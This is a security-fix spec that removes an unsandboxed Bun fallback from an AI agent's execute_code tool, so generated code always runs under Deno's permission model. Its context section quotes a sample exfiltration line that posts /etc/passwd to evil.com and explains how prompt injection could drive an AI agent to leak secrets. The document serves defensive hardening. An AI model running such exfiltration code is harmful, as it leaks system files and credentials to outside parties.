# SP-83 Execute Code: Require Deno (Remove Unsandboxed Bun Fallback)

> Security fix: **C5** from security audit 2026-04-09.

## Main objective

Remove the Bun fallback in `execute_code` so that code execution **always**
runs under Deno's permission model. If Deno is not installed, the tool must
fail with a clear error instead of silently running user code with full
filesystem and network access.

## Context

`src/tools/execute_code.ts:108-117` currently does:

```typescript
const deno = getDeno();
const cmd = deno
  ? [deno, "run", `--allow-net=127.0.0.1:${bridge.port}`, "--no-prompt", tmpFile]
  : ["bun", "run", tmpFile]; // fallback: no OS-level sandboxing
```

When Deno is present, code runs with **only** `--allow-net=127.0.0.1:{port}`
— no filesystem access, no env access, no subprocess spawning. The bridge
server mediates all file I/O through an allowlisted session directory.

When Deno is absent, code runs via `bun run` which has **zero OS-level
restrictions** — full filesystem read/write, full network, full env access.
The bridge-based `tools.*` API is still injected, but nothing prevents the
code from bypassing it with raw `import { readFileSync } from "fs"` or
`await fetch("https://evil.com", { body: Bun.file("/etc/passwd") })`.

This is a critical sandbox escape. The LLM generates the code; a prompt
injection attack can craft arbitrary TypeScript that exfiltrates secrets,
reads `.env`, or modifies files outside the session directory.

## Out of scope

- Changing the Deno permission flags (current set is correct).
- Adding Docker/VM-level isolation (future improvement).
- Modifying the bridge server or prelude.
- Changing the tool schema or description.

## Constraints

- No new runtime dependencies.
- Must not break existing tests.
- The error message when Deno is missing must be actionable (include install
  instructions).

## Changes

### 1. Remove Bun fallback — `src/tools/execute_code.ts`

**Current** (lines 107-117):
```typescript
const deno = getDeno();
const cmd = deno
  ? [deno, "run", `--allow-net=127.0.0.1:${bridge.port}`, "--no-prompt", tmpFile]
  : ["bun", "run", tmpFile];
```

**Target**:
```typescript
const deno = getDeno();
if (!deno) {
  throw new Error(
    "execute_code requires Deno for sandboxed execution but Deno was not found. " +
    "Install it: curl -fsSL https://deno.land/install.sh | sh"
  );
}
const cmd = [deno, "run", `--allow-net=127.0.0.1:${bridge.port}`, "--no-prompt", tmpFile];
```

The check happens once per call (after `getDeno()` caches the lookup). No
performance impact.

### 2. Add startup warning — `src/tools/execute_code.ts`

Add a top-level warning at module load so operators see it immediately
instead of waiting for the first tool call to fail:

```typescript
if (!getDeno()) {
  console.warn("[execute_code] WARNING: Deno not found — execute_code tool will be unavailable until Deno is installed.");
}
```

### 3. Update tool description — `src/tools/execute_code.ts`

Add to the schema description:

> Requires Deno runtime for sandboxed execution. The tool will error if Deno
> is not installed.

This gives the LLM context to avoid calling the tool when it will fail.

## Test plan

1. **Deno present**: Run `execute_code` with simple `console.log("ok")` —
   verify it works unchanged.
2. **Deno absent**: Temporarily rename deno binary, call `execute_code` —
   verify it throws the install error (not silent Bun execution).
3. **Sandbox enforcement**: With Deno present, run code that attempts
   `Bun.file("/etc/passwd").text()` — verify Deno blocks it.
4. **Existing tests**: `bun test src/tools/execute_code` passes.